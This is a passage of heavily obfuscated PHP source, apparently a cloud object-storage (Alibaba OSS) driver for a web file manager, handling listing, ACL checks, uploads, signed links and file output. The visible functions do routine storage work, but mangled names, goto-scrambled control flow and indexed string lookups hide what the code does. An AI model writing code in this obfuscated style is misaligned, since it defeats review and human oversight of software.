(array_chunk($FøòËÕŠ‡[$Cé•–š™§[73]], 1000) as $E†Œ«ÁŸË) { try { $this->client->deleteObjects($this->bucket, $E†Œ«ÁŸË); } catch (OSS\Core\OssException $dŒÏ‰øËîÉ) { continue; } } return !0; } public function rename($eÑÔ×é¢Àå, $BŞ äß‘İ) { return $this->renameObject($eÑÔ×é¢Àå, $BŞ äß‘İ); } private function fileInfo($f™Û¯ï‡¯™, $D” Õ’‹Ü· = array()) { goto fØì±´¹Š…; cîŞå¬Ÿçœ: return $fÕ®½àô; goto aÂÔÄ–ëÂç; fØì±´¹Š…: $F†ˆ‘¸Éññ =& $_SERVER[ã®Â„Éæ¹¤]; $fÕ®½àô = array($F†ˆ‘¸Éññ[28] => $this->pathThis($f™Û¯ï‡¯™), $F†ˆ‘¸Éññ[75] => $this->getPathOuter($f™Û¯ï‡¯™), $F†ˆ‘¸Éññ[29] => $F†ˆ‘¸Éññ[167], $F†ˆ‘¸Éññ[187] => 0, $F†ˆ‘¸Éññ[107] => 0, $F†ˆ‘¸Éññ[77] => 0, $F†ˆ‘¸Éññ[160] => $this->ext($f™Û¯ï‡¯™), $F†ˆ‘¸Éññ[188] => !0, $F†ˆ‘¸Éññ[189] => !0); if (empty($D” Õ’‹Ü·)) { $fèàÖ—Ç = $this->objectMeta($f™Û¯ï‡¯™); if (!$fèàÖ—Ç) { return $fÕ®½àô; } $D” Õ’‹Ü· = array($F†ˆ‘¸Éññ[107] => strtotime($fèàÖ—Ç[$F†ˆ‘¸Éññ[1208]]), $F†ˆ‘¸Éññ[77] => $fèàÖ—Ç[$F†ˆ‘¸Éññ[1209]] + 0); } goto Aç‘œÊ»ª; Aç‘œÊ»ª: if (isset($D” Õ’‹Ü·[$F†ˆ‘¸Éññ[77]])) { $fÕ®½àô[$F†ˆ‘¸Éññ[77]] = $D” Õ’‹Ü·[$F†ˆ‘¸Éññ[77]]; } if (isset($D” Õ’‹Ü·[$F†ˆ‘¸Éññ[107]])) { $fÕ®½àô[$F†ˆ‘¸Éññ[107]] = $D” Õ’‹Ü·[$F†ˆ‘¸Éññ[107]]; } if (isset($D” Õ’‹Ü·[$F†ˆ‘¸Éññ[190]]) && !trim($fÕ®½àô[$F†ˆ‘¸Éññ[107]])) { $fÕ®½àô[$F†ˆ‘¸Éññ[107]] = $D” Õ’‹Ü·[$F†ˆ‘¸Éññ[190]]; } goto cîŞå¬Ÿçœ; aÂÔÄ–ëÂç: } private function folderInfo($bäË¥´¡ÒÇ, $ağÔ‚ÖŞï = array()) { $bğöêÒŸ =& $_SERVER[ã®Â„Éæ¹¤]; $AÎ‰êÖ‘ö¸ = array($bğöêÒŸ[28] => $this->pathThis($bäË¥´¡ÒÇ), $bğöêÒŸ[75] => $this->getPathOuter($bğöêÒŸ[8] . $bäË¥´¡ÒÇ), $bğöêÒŸ[29] => $bğöêÒŸ[76], $bğöêÒŸ[187] => 0, $bğöêÒŸ[107] => 0, $bğöêÒŸ[188] => !0, $bğöêÒŸ[189] => !0); if (empty($ağÔ‚ÖŞï)) { $bäË¥´¡ÒÇ = rtrim($bäË¥´¡ÒÇ, $bğöêÒŸ[8]) . $bğöêÒŸ[8]; $DèÌİ¬¢äÜ = $this->objectMeta($bäË¥´¡ÒÇ); if (!$DèÌİ¬¢äÜ) { return $AÎ‰êÖ‘ö¸; } $ağÔ‚ÖŞï = array($bğöêÒŸ[187] => $DèÌİ¬¢äÜ[$bğöêÒŸ[1210]][$bğöêÒŸ[1211]], $bğöêÒŸ[107] => strtotime($DèÌİ¬¢äÜ[$bğöêÒŸ[1208]])); } if (isset($ağÔ‚ÖŞï[$bğöêÒŸ[107]])) { $AÎ‰êÖ‘ö¸[$bğöêÒŸ[107]] = $ağÔ‚ÖŞï[$bğöêÒŸ[107]]; } if (isset($ağÔ‚ÖŞï[$bğöêÒŸ[187]])) { $AÎ‰êÖ‘ö¸[$bğöêÒŸ[187]] = $ağÔ‚ÖŞï[$bğöêÒŸ[187]]; } return $AÎ‰êÖ‘ö¸; } public function listPath($eÄ˜ƒ×âêñ, $A¸ƒÓ‚ = false) { $AÄìÍ‰­Ñ´ =& $_SERVER[ã®Â„Éæ¹¤]; $D°îˆë¸ã… = $this->fileList($eÄ˜ƒ×âêñ, $AÄìÍ‰­Ñ´[8], !0); foreach ($D°îˆë¸ã…[$AÄìÍ‰­Ñ´[74]] as $b±êÏ©Œ–ô => $F‚„¾Š³Á) { $D°îˆë¸ã…[$AÄìÍ‰­Ñ´[74]][$b±êÏ©Œ–ô] = $this->folderInfo($F‚„¾Š³Á, $F‚„¾Š³Á); } foreach ($D°îˆë¸ã…[$AÄìÍ‰­Ñ´[73]] as $b±êÏ©Œ–ô => $F‚„¾Š³Á) { $D°îˆë¸ã…[$AÄìÍ‰­Ñ´[73]][$b±êÏ©Œ–ô] = $this->fileInfo($F‚„¾Š³Á[$AÄìÍ‰­Ñ´[28]], $F‚„¾Š³Á); } return $D°îˆë¸ã…; } public function has($d¾›×¦ËÚ¸, $CôÙè“™Åñ = false, $Cñ™Ø…¹ñí = true) { goto c‘‰·ïÕ¸İ; C¹Š¯áæì®: $e£«„§Æ­æ = 0; while (!0) { $D ‚àÇ’ãÉ = array($Ešø³åØ™¼[1199] => $Ešø³åØ™¼[8], $Ešø³åØ™¼[186] => $BÛÊòÉ×Æ, $Ešø³åØ™¼[1200] => $A‰Ÿ©¦„†Ã, $Ešø³åØ™¼[1201] => $A‘™¨ºÜİ«); try { $fíö²°êÚ¨ = $this->client->listObjects($this->bucket, $D ‚àÇ’ãÉ); } catch (OSS\Core\OssException $E÷åË“ÍÛ—) { break; } $A‘™¨ºÜİ« = $fíö²°êÚ¨->getNextMarker(); $D‡ôÎµäÕ = $fíö²°êÚ¨->getObjectList(); $B¢‘Ô»¶§Ù = $fíö²°êÚ¨->getPrefixList(); if ($CôÙè“™Åñ) { if (count($D‡ôÎµäÕ) > 1 || count($D‡ôÎµäÕ) == 1 && $D‡ôÎµäÕ[0]->getKey() != $BÛÊòÉ×Æ) { $F“ô˜ØêçŒ += count($D‡ôÎµäÕ) - 1; } if (!empty($B¢‘Ô»¶§Ù)) { $e£«„§Æ­æ += count($B¢‘Ô»¶§Ù); } if ($A‘™¨ºÜİ« === $Ešø³åØ™¼[33]) { break; } continue; } if ($Cñ™Ø…¹ñí) { if (!empty($D‡ôÎµäÕ)) { if (count($D‡ôÎµäÕ) > 1 || $D‡ôÎµäÕ[0]->getKey() != $BÛÊòÉ×Æ) { return !0; } } } else { if (!empty($B¢‘Ô»¶§Ù)) { return !0; } } if ($A‘™¨ºÜİ« === $Ešø³åØ™¼[33]) { break; } } if ($CôÙè“™Åñ) { return array($Ešø³åØ™¼[191] => $F“ô˜ØêçŒ, $Ešø³åØ™¼[192] => $e£«„§Æ­æ); } goto CÃØ¶Æ²¢à; CÃØ¶Æ²¢à: return !1; goto B©’½©Àèé; b¶³à•è†‚: $A‘™¨ºÜİ« = $Ešø³åØ™¼[33]; $A‰Ÿ©¦„†Ã = 500; $F“ô˜ØêçŒ = 0; goto C¹Š¯áæì®; c‘‰·ïÕ¸İ: $Ešø³åØ™¼ =& $_SERVER[ã®Â„Éæ¹¤]; $d¾›×¦ËÚ¸ = trim($d¾›×¦ËÚ¸, $Ešø³åØ™¼[8]); $BÛÊòÉ×Æ = empty($d¾›×¦ËÚ¸) ? $Ešø³åØ™¼[33] : $d¾›×¦ËÚ¸ . $Ešø³åØ™¼[8]; goto b¶³à•è†‚; B©’½©Àèé: } public function listAll($BÚ«À—å™ö) { $B„Õƒ·­– =& $_SERVER[ã®Â„Éæ¹¤]; $FœŠ÷Ú¢ = $this->fileList($BÚ«À—å™ö, $B„Õƒ·­–[33], !0); $EŠÅ»†·×’ = array(); foreach ($FœŠ÷Ú¢[$B„Õƒ·­–[73]] as $a†Ò‰±ÀñË) { $EŠÅ»†·×’[$a†Ò‰±ÀñË[$B„Õƒ·­–[28]]] = $a†Ò‰±ÀñË[$B„Õƒ·­–[77]]; } return $this->listAllFiles($BÚ«À—å™ö, array_keys($EŠÅ»†·×’), $EŠÅ»†·×’); } public function canRead($Cì×‘Ê¤–˜) { $b¿ëÆ°±¬ô =& $_SERVER[ã®Â„Éæ¹¤]; $aÏÒ–ÕÊëî = $this->pathAcl($Cì×‘Ê¤–˜); return $aÏÒ–ÕÊëî == $b¿ëÆ°±¬ô[1212] || $aÏÒ–ÕÊëî == $b¿ëÆ°±¬ô[493] ? !0 : !1; } public function canWrite($Aë…Ì§öĞâ) { $Aóì‘éÀØÀ = $this->pathAcl($Aë…Ì§öĞâ); return $Aóì‘éÀØÀ == $_SERVER[ã®Â„Éæ¹¤][493] ? !0 : !1; } public function pathAcl($c¸½Æ†¶‹) { goto D¿Û·ĞëÛå; D¿Û·ĞëÛå: $eèÀ¶‚Ì¸„ =& $_SERVER[ã®Â„Éæ¹¤]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $d‚ƒƒó³îê = $this->client->getObjectAcl($this->bucket, $this->pathEncode($c¸½Æ†¶‹)); } catch (OSS\Core\OssException $Eˆ‘Â¥ÂÏ) { return !1; } goto D½ùÈ¼°ğ³; D½ùÈ¼°ğ³: $f–­é«‘Œ = $d‚ƒƒó³îê == $eèÀ¶‚Ì¸„[34] ? $this->bucketAcl : $d‚ƒƒó³îê; if ($f–­é«‘Œ == $eèÀ¶‚Ì¸„[1213]) { return $eèÀ¶‚Ì¸„[1212]; } if ($f–­é«‘Œ == $eèÀ¶‚Ì¸„[1214]) { return $eèÀ¶‚Ì¸„[493]; } goto CŠ·Š¿‰Ñ¢; CŠ·Š¿‰Ñ¢: return $f–­é«‘Œ; goto dî‰ÖäÁœ; dî‰ÖäÁœ: } private function chmodPath($eå¦«ø—Şò, $d’¤ÑÛé†° = '') { $eŸ¸Àƒƒ´ =& $_SERVER[ã®Â„Éæ¹¤]; $D¶äŞ¦ùäÑ = empty($d’¤ÑÛé†°) ? $eŸ¸Àƒƒ´[1214] : $d’¤ÑÛé†°; $fàÓ­’ø›¼ = array($eŸ¸Àƒƒ´[34], $eŸ¸Àƒƒ´[185], $eŸ¸Àƒƒ´[1213], $eŸ¸Àƒƒ´[1214]); if (!in_array($D¶äŞ¦ùäÑ, $fàÓ­’ø›¼)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($eå¦«ø—Şò), $D¶äŞ¦ùäÑ); } catch (OSS\Core\OssException $FÕÅÍ­¡Ó) { return !1; } return !0; } public function getContent($F¸Á¡¾È…‚) { return $this->fileSubstr($F¸Á¡¾È…‚, -1); } public function setContent($eÆ¾ÀĞóÃÑ, $dÓ¾ô·ó¯ù = '') { $B°Ôäá†‚î =& $_SERVER[ã®Â„Éæ¹¤]; try { $EçÖºÇŠæ‘ = $this->trafficLimit($B°Ôäá†‚î[1215]); $FÒÓõäÀ ‰ = $this->client->putObject($this->bucket, $this->pathEncode($eÆ¾ÀĞóÃÑ), $dÓ¾ô·ó¯ù, $EçÖºÇŠæ‘); } catch (OSS\Core\OssException $eè÷¾¿êâ‹) { return !1; } $D…Õ±‡® = array($B°Ôäá†‚î[1202] => trim($FÒÓõäÀ ‰[$B°Ôäá†‚î[1216]], $B°Ôäá†‚î[113]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($eÆ¾ÀĞóÃÑ))); $this->updateObjMeta($eÆ¾ÀĞóÃÑ, $D…Õ±‡®); return isset($FÒÓõäÀ ‰[$B°Ôäá†‚î[1217]][$B°Ôäá†‚î[1165]]) ? (int) $FÒÓõäÀ ‰[$B°Ôäá†‚î[1217]][$B°Ôäá†‚î[1165]] : strlen($FÒÓõäÀ ‰); } private function updateObjMeta($c´ïà˜•±, $e¨­¬Š–¨) { $c´ïà˜•± = $this->pathEncode($c´ïà˜•±); try { $båìë¤Õøö = array(OSS\OssClient::OSS_HEADERS => $e¨­¬Š–¨); $this->client->copyObject($this->bucket, $c´ïà˜•±, $this->bucket, $c´ïà˜•±, $båìë¤Õøö); } catch (OSS\Core\OssException $cæ×íÊìÜÔ) { return !1; } return !0; } public function upload($bß‡¹º§·ë, $AÊĞŸ²ô«ù, $eíĞŞŸ•Ç¢ = false, $Cµ»¼©„ìê = REPEAT_REPLACE) { $eÒˆ”øÖ…´ =& $_SERVER[ã®Â„Éæ¹¤]; $DÓ¸„Úø… = trim($bß‡¹º§·ë, $eÒˆ”øÖ…´[8]); $E”±¨†¾ƒŸ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($eÒˆ”øÖ…´[1202] => @md5_file($AÊĞŸ²ô«ù)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($bß‡¹º§·ë))); $E”±¨†¾ƒŸ = $this->trafficLimit($eÒˆ”øÖ…´[1215], $E”±¨†¾ƒŸ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($DÓ¸„Úø…), $AÊĞŸ²ô«ù, $E”±¨†¾ƒŸ); } catch (OSS\Core\OssException $fÅÓ™¡¤ã) { return !1; } return $this->getPathOuter($bß‡¹º§·ë); } public function getHost() { $a§÷ïö„è =& $_SERVER[ã®Â„Éæ¹¤]; $DÅ§ÓÎ‘ìñ = explode($a§÷ïö„è[171], parent::getHost()); return $DÅ§ÓÎ‘ìñ[0] . $a§÷ïö„è[171] . $this->bucket . $a§÷ïö„è[91] . $DÅ§ÓÎ‘ìñ[1]; } public function uploadFormData($e¾ŞçÆç»¢, $Cóƒ‚æ©ÌÈ = 3600) { goto a¼Şè¶»ŞÉ; E®Ú“„æŸñ: $EŠÒ½¨´‚å = date($F¤ì°¶á¤[1218], time() + $b‘•Ò¶æ­í); $bÔ’‰¬‡šç = new DateTime($EŠÒ½¨´‚å); $Eİ°‘’À = $bÔ’‰¬‡šç->format(DateTime::ISO8601); goto C„ÆÓó‚à; Eä»¢ºªÙ: $aµ¯ÖÃÙ‹• = $this->pathFather($e¾ŞçÆç»¢); $dÖâ±×ÆÀ = array($F¤ì°¶á¤[1121] => $Eİ°‘’À, $F¤ì°¶á¤[1122] => array(array($F¤ì°¶á¤[1220], 0, $fÜ†Ä•†Í†), array($F¤ì°¶á¤[1125], $F¤ì°¶á¤[1126], $aµ¯ÖÃÙ‹•))); $bÒÔ„™ŞœÚ = base64_encode(json_encode($dÖâ±×ÆÀ)); goto CŠàë³½¨ä; C„ÆÓó‚à: $fùÊä÷Şè = strpos($Eİ°‘’À, $F¤ì°¶á¤[284]); $Eİ°‘’À = substr($Eİ°‘’À, 0, $fùÊä÷Şè) . $F¤ì°¶á¤[1219]; $fÜ†Ä•†Í† = 1048576000 * 5; goto Eä»¢ºªÙ; a¼Şè¶»ŞÉ: $F¤ì°¶á¤ =& $_SERVER[ã®Â„Éæ¹¤]; if (!($DÈ¸ÛØÜó = $this->getHost())) { return !1; } $b‘•Ò¶æ­í = $Cóƒ‚æ©ÌÈ; goto E®Ú“„æŸñ; CŠàë³½¨ä: $bÉê‡ïìˆ¡ = base64_encode(hash_hmac($F¤ì°¶á¤[218], $bÒÔ„™ŞœÚ, $this->secret, !0)); $A±ñ¹Àæš = array($F¤ì°¶á¤[1131] => $bÒÔ„™ŞœÚ, $F¤ì°¶á¤[1221] => $this->accessKey, $F¤ì°¶á¤[1127] => $F¤ì°¶á¤[1119], $F¤ì°¶á¤[1222] => $bÉê‡ïìˆ¡, $F¤ì°¶á¤[169] => $DÈ¸ÛØÜó); $A±ñ¹Àæš = $this->trafficLimit($F¤ì°¶á¤[1215], $A±ñ¹Àæš); goto FäŠ‚à©µ; FäŠ‚à©µ: return $A±ñ¹Àæš; goto f‘‚”ÎƒÅ—; f‘‚”ÎƒÅ—: } public function multiUploadFormData($eš÷•ÛÍµ, $Aìâ©©à©´ = 3600) { $d—Í¾å¼ªö =& $_SERVER[ã®Â„Éæ¹¤]; if (!($CÆó¤†Ã¶Ô = $this->getHost())) { return !1; } $fŸƒ£èà°¾ = $this->trafficLimit($d—Í¾å¼ªö[1215]); $bªôÏÀâ‡ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($eš÷•ÛÍµ), $fŸƒ£èà°¾); return array($d—Í¾å¼ªö[209] => $bªôÏÀâ‡, $d—Í¾å¼ªö[169] => $CÆó¤†Ã¶Ô . $d—Í¾å¼ªö[8] . $this->pathEncode($eš÷•ÛÍµ), $d—Í¾å¼ªö[210] => gmdate($d—Í¾å¼ªö[1223]), $d—Í¾å¼ªö[89] => $eš÷•ÛÍµ); } public function multiUploadAuthData($a–ÉÄÃŸ , $fØãÙ¥»ó = array()) { goto b¬‹ïƒÚ¥Ê; eÁá¬ö…Ûğ: if (!empty($fØãÙ¥»ó[$eÈŸµ©ÚŠâ[1225]])) { $bÇàóÀØù = array_merge(array($BÁ²‚¡Á­ˆ[4]), $fØãÙ¥»ó[$eÈŸµ©ÚŠâ[1225]]); sort($bÇàóÀØù); $BÁ²‚¡Á­ˆ[4] = implode($eÈŸµ©ÚŠâ[217], $bÇàóÀØù); } $C‚‹©»ã„¸ = implode($eÈŸµ©ÚŠâ[217], $BÁ²‚¡Á­ˆ); $BƒíÈÅ«Ÿ = base64_encode(hash_hmac($eÈŸµ©ÚŠâ[218], $C‚‹©»ã„¸, $this->secret, !0)); goto aåãªÇ‡; aåãªÇ‡: $Dó‘Ö›–‚ = $eÈŸµ©ÚŠâ[1226] . $this->accessKey . $eÈŸµ©ÚŠâ[4] . $BƒíÈÅ«Ÿ; if (strpos($cÄ²ïâÀšŠ, $eÈŸµ©ÚŠâ[213]) === 0) { $Dó‘Ö›–‚ = array($eÈŸµ©ÚŠâ[220] => $Dó‘Ö›–‚, $eÈŸµ©ÚŠâ[210] => $F’æ¾Éâ­); if ($BÍ±‰ã²í‹) { $Dó‘Ö›–‚ = array_merge($Dó‘Ö›–‚, $BÍ±‰ã²í‹); } } return $Dó‘Ö›–‚; goto FÑò¿øë´»; aà½ÂÄ½†¶: $Fˆì¶ñà²Å = $a–ÉÄÃŸ ; if (isset($fØãÙ¥»ó[$eÈŸµ©ÚŠâ[89]])) { $Fˆì¶ñà²Å = $fØãÙ¥»ó[$eÈŸµ©ÚŠâ[89]]; unset($fØãÙ¥»ó[$eÈŸµ©ÚŠâ[89]]); } if (isset($fØãÙ¥»ó[$eÈŸµ©ÚŠâ[211]])) { $fØãÙ¥»ó[$eÈŸµ©ÚŠâ[210]] = $F’æ¾Éâ­; return $this->listUploadParts($Fˆì¶ñà²Å, $fØãÙ¥»ó); } goto dÈÌÈ˜÷À; dÈÌÈ˜÷À: $BÁ²‚¡Á­ˆ = array($eÈŸµ©ÚŠâ[212], $eÈŸµ©ÚŠâ[33], $eÈŸµ©ÚŠâ[116], $F’æ¾Éâ­, "\170\55\157\163\x73\x2d\144\141\164\x65\72{$F’æ¾Éâ­}", $eÈŸµ©ÚŠâ[8] . $this->bucket . $eÈŸµ©ÚŠâ[8] . $Fˆì¶ñà²Å . $cÄ²ïâÀšŠ); if (strpos($cÄ²ïâÀšŠ, $eÈŸµ©ÚŠâ[213]) === 0) { $BÁ²‚¡Á­ˆ[0] = $eÈŸµ©ÚŠâ[214]; if ($BÍ±‰ã²í‹ = $this->trafficLimit($eÈŸµ©ÚŠâ[1215])) { $Fˆì¶ñà²Å = $eÈŸµ©ÚŠâ[1224]; array_splice($BÁ²‚¡Á­ˆ, 5, 0, $Fˆì¶ñà²Å . $eÈŸµ©ÚŠâ[4] . $BÍ±‰ã²í‹[$Fˆì¶ñà²Å]); } } if (isset($fØãÙ¥»ó[$eÈŸµ©ÚŠâ[215]]) && $fØãÙ¥»ó[$eÈŸµ©ÚŠâ[215]] == $eÈŸµ©ÚŠâ[216]) { $BÁ²‚¡Á­ˆ[0] = $eÈŸµ©ÚŠâ[216]; } goto eÁá¬ö…Ûğ; b¬‹ïƒÚ¥Ê: $eÈŸµ©ÚŠâ =& $_SERVER[ã®Â„Éæ¹¤]; $F’æ¾Éâ­ = isset($fØãÙ¥»ó[$eÈŸµ©ÚŠâ[210]]) ? $fØãÙ¥»ó[$eÈŸµ©ÚŠâ[210]] : gmdate($eÈŸµ©ÚŠâ[1223]); $cÄ²ïâÀšŠ = isset($fØãÙ¥»ó[$eÈŸµ©ÚŠâ[160]]) ? $fØãÙ¥»ó[$eÈŸµ©ÚŠâ[160]] : $eÈŸµ©ÚŠâ[33]; goto aà½ÂÄ½†¶; FÑò¿øë´»: } public function listUploadParts($E»ì°õâ©Œ, $eâÅëÙÔ®) { goto E‘ğº‹ÍÊ; E‘ğº‹ÍÊ: $e¹›ÚÕ“½î =& $_SERVER[ã®Â„Éæ¹¤]; $bİñ·¬¾„Ó = parse_url_query($eâÅëÙÔ®[$e¹›ÚÕ“½î[160]]); $A›Úá‡á ¯ = $this->client->listParts($this->bucket, $this->pathEncode($E»ì°õâ©Œ), $bİñ·¬¾„Ó[$e¹›ÚÕ“½î[209]]); goto B¥ğÁæÅ™º; fœ¾ˆÉÜâ: unset($eâÅëÙÔ®[$e¹›ÚÕ“½î[211]], $eâÅëÙÔ®[$e¹›ÚÕ“½î[215]]); $DŸ—ñŠ¯ñ” = $this->multiUploadAuthData($E»ì°õâ©Œ, $eâÅëÙÔ®); if (empty($DŸ—ñŠ¯ñ”)) { return !1; } goto Fç–å÷Ÿ¥; Fç–å÷Ÿ¥: return array($e¹›ÚÕ“½î[220] => $DŸ—ñŠ¯ñ”, $e¹›ÚÕ“½î[210] => $eâÅëÙÔ®[$e¹›ÚÕ“½î[210]], $e¹›ÚÕ“½î[222] => $c‚´ÛÁê±); goto A£ËŒ±ÈòÄ; B¥ğÁæÅ™º: $D”œ‰íå­« = $A›Úá‡á ¯->getListPart(); $c‚´ÛÁê± = array(); foreach ($D”œ‰íå­« as $Dâæ×øŒ°¥) { $c‚´ÛÁê±[] = array($e¹›ÚÕ“½î[1206] => $Dâæ×øŒ°¥->getPartNumber(), $e¹›ÚÕ“½î[1207] => trim($Dâæ×øŒ°¥->getETag(), $e¹›ÚÕ“½î[113])); } goto fœ¾ˆÉÜâ; A£ËŒ±ÈòÄ: } public function download($Báˆš´¼’Ç, $fø©ŠÛ‰¾Š) { if ($this->isFolder($Báˆš´¼’Ç)) { return !1; } try { $CĞó‘‚Š¾æ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $fø©ŠÛ‰¾Š); $CĞó‘‚Š¾æ = $this->trafficLimit($_SERVER[ã®Â„Éæ¹¤][105], $CĞó‘‚Š¾æ); $this->client->getObject($this->bucket, $this->pathEncode($Báˆš´¼’Ç), $CĞó‘‚Š¾æ); } catch (OSS\Core\OssException $fåÊ™Ãï) { return !1; } return $fø©ŠÛ‰¾Š; } public function fileSubstr($CçÚìÀâ×¨, $DİÑš›ÖÇœ = 0, $A±ºùôœÖÑ = false) { if ($DİÑš›ÖÇœ === -1) { $f¥ÈÄƒ—ÅÍ = array(); } else { if ($A±ºùôœÖÑ === !1) { $bÈóš¶ô¦ñ = $this->size($CçÚìÀâ×¨); } else { $bÈóš¶ô¦ñ = $DİÑš›ÖÇœ + $A±ºùôœÖÑ - 1; } $f¥ÈÄƒ—ÅÍ = array(OSS\OssClient::OSS_RANGE => "{$DİÑš›ÖÇœ}\x2d{$bÈóš¶ô¦ñ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($CçÚìÀâ×¨), $f¥ÈÄƒ—ÅÍ); } catch (OSS\Core\OssException $CÍŠÜØãÜÅ) { think_exception($CÍŠÜØãÜÅ->getMessage()); return !1; } } private function trafficLimit($b›®ƒç¥†¡, $CšÜ«£ÍÀµ = array()) { goto Aª“Ëîš¼; Aª“Ëîš¼: $EÜÖÛšøñ =& $_SERVER[ã®Â„Éæ¹¤]; if ($b›®ƒç¥†¡ == $EÜÖÛšøñ[1215] && $this->isUploadServer() || $b›®ƒç¥†¡ == $EÜÖÛšøñ[105] && $this->isFileOutServer()) { return $CšÜ«£ÍÀµ; } $AË•â†Œ–ƒ = floatval($GLOBALS[$EÜÖÛšøñ[6]][$EÜÖÛšøñ[84]][$EÜÖÛšøñ[103]][$b›®ƒç¥†¡]) * 1024 * 1024 * 8; goto AßöÇãªÓë; AßöÇãªÓë: if (!$AË•â†Œ–ƒ) { return $CšÜ«£ÍÀµ; } $AË•â†Œ–ƒ = $AË•â†Œ–ƒ < 819200 ? 819200 : ($AË•â†Œ–ƒ > 838860800 ? 838860800 : $AË•â†Œ–ƒ); $CšÜ«£ÍÀµ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($AË•â†Œ–ƒ); goto dÙš³¼Œ; dÙš³¼Œ: return $CšÜ«£ÍÀµ; goto dÛ‰ÓˆĞÑ; dÛ‰ÓˆĞÑ: } public function link($eœÎ„¬ïé×, $e”¼ñˆ¼ÓÕ = array()) { $F¿‰ÊƒÎ´ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$this->exist($eœÎ„¬ïé×) || $this->isFolder($eœÎ„¬ïé×)) { return !1; } try { $e”¼ñˆ¼ÓÕ = $this->trafficLimit($F¿‰ÊƒÎ´[105], $e”¼ñˆ¼ÓÕ); $BïÙĞ‰˜¥å = $this->client->signUrl($this->bucket, $this->pathEncode($eœÎ„¬ïé×), 3600 * 12, $F¿‰ÊƒÎ´[216], $e”¼ñˆ¼ÓÕ); return $this->getCdnLink($BïÙĞ‰˜¥å); } catch (OSS\Core\OssException $DÃùÅ…áÛ) { return !1; } } public function fileOut($eÇåÎÊÀ¶‰, $eš™Ê©ğ¬Œ = false, $DÅ¾Ûò÷ƒ = false, $EâÚöªãù = '') { goto dº·µ§›; dº·µ§›: $F°¹œˆÛÃ³ =& $_SERVER[ã®Â„Éæ¹¤]; if ($this->isFileOutServer()) { return $this->fileOutServer($eÇåÎÊÀ¶‰, $eš™Ê©ğ¬Œ, $DÅ¾Ûò÷ƒ, $EâÚöªãù); } if (!$DÅ¾Ûò÷ƒ) { $DÅ¾Ûò÷ƒ = $this->pathThis($eÇåÎÊÀ¶‰); } goto a†İ•µ›ñ; c­Á‹ÁÓ…: $eš™Ê©ğ¬Œ = $eš™Ê©ğ¬Œ ? $F°¹œˆÛÃ³[202] : $F°¹œˆÛÃ³[203]; $F‘³œíÕô = array(OSS\OssClient::OSS_SUB_RESOURCE => $F°¹œˆÛÃ³[1227] . rawurlencode("{$eš™Ê©ğ¬Œ}\73\146\151\154\145\156\x61\x6d\145\75{$DÅ¾Ûò÷ƒ}")); $F‘³œíÕô[OSS\OssClient::OSS_SUB_RESOURCE] .= $F°¹œˆÛÃ³[1228] . rawurlencode($Dï„É«Óæ¬); goto e†åö­ÎÄ•; a†İ•µ›ñ: $DÅ¾Ûò÷ƒ = rawurlencode($DÅ¾Ûò÷ƒ); $Dï„É«Óæ¬ = get_file_mime(get_path_ext($DÅ¾Ûò÷ƒ)); if ($Dï„É«Óæ¬ == $F°¹œˆÛÃ³[201]) { return parent::fileOut($eÇåÎÊÀ¶‰, $eš™Ê©ğ¬Œ, $DÅ¾Ûò÷ƒ, $EâÚöªãù); } goto c­Á‹ÁÓ…; e†åö­ÎÄ•: $A¥áêíòÀ‹ = $this->link($eÇåÎÊÀ¶‰, $F‘³œíÕô); $this->fileOutLink($A¥áêíòÀ‹); goto d»ŠŸ½‚µ£; d»ŠŸ½‚µ£: } public function fileOutServer($bĞ„Ääâ–é, $c¦ó˜‘¾ = false, $eÀÊ“ÛÉ‰í = false, $B„°´·¦ë = '') { parent::fileOut($bĞ„Ääâ–é, $c¦ó˜‘¾, $eÀÊ“ÛÉ‰í, $B„°´·¦ë); } public function fileOutImage($E»ğ÷º†°, $BÑ¨ö¤ñë¹ = 250) { $DÉ„»ÑèŠã = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ã®Â„Éæ¹¤][1229] . $BÑ¨ö¤ñë¹); $d˜ÅºªŸ‘ = $this->link($E»ğ÷º†°, $DÉ„»ÑèŠã); $this->fileOutLink($d˜ÅºªŸ‘); } public function fileOutImageServer($A± ö÷ÁÌ, $BÖŒ­°²Š¡ = 250) { parent::fileOutImage($A± ö÷ÁÌ, $BÖŒ­°²Š¡); } public function fileOutLink($eŞ•Å±î§) { $cÔ•­†‘ˆ— =& $_SERVER[ã®Â„Éæ¹¤]; if (!$this->isCdnHost() && substr($eŞ•Å±î§, 0, 7) == $cÔ•­†‘ˆ—[1134]) { $eŞ•Å±î§ = $cÔ•­†‘ˆ—[1135] . substr($eŞ•Å±î§, 7); } header($cÔ•­†‘ˆ—[156] . $eŞ•Å±î§); die; } public function hashMd5($cšÒòÀ“, $A³‰ã¶èó³ = '') { $c³·Œ·“Ú =& $_SERVER[ã®Â„Éæ¹¤]; $a¨¨ĞŞ±Õò = $this->objectMeta($cšÒòÀ“); if (!$a¨¨ĞŞ±Õò) { return $c³·Œ·“Ú[33]; } if (!isset($a¨¨ĞŞ±Õò[$c³·Œ·“Ú[1202]]) && !empty($A³‰ã¶èó³)) { $Eáƒ›—©Ùø = $this->updateObjMeta($cšÒòÀ“, array($c³·Œ·“Ú[1202] => $A³‰ã¶èó³)); $a¨¨ĞŞ±Õò[$c³·Œ·“Ú[1202]] = $Eáƒ›—©Ùø ? $A³‰ã¶èó³ : $c³·Œ·“Ú[33]; } return isset($a¨¨ĞŞ±Õò[$c³·Œ·“Ú[1202]]) ? strtolower($a¨¨ĞŞ±Õò[$c³·Œ·“Ú[1202]]) : $c³·Œ·“Ú[33]; } public function size($Eí»«šŒÍƒ) { $Aö¼ˆÉ³¨ = $this->objectMeta($Eí»«šŒÍƒ); return $Aö¼ˆÉ³¨ ? $Aö¼ˆÉ³¨[$_SERVER[ã®Â„Éæ¹¤][77]] : 0; } public function 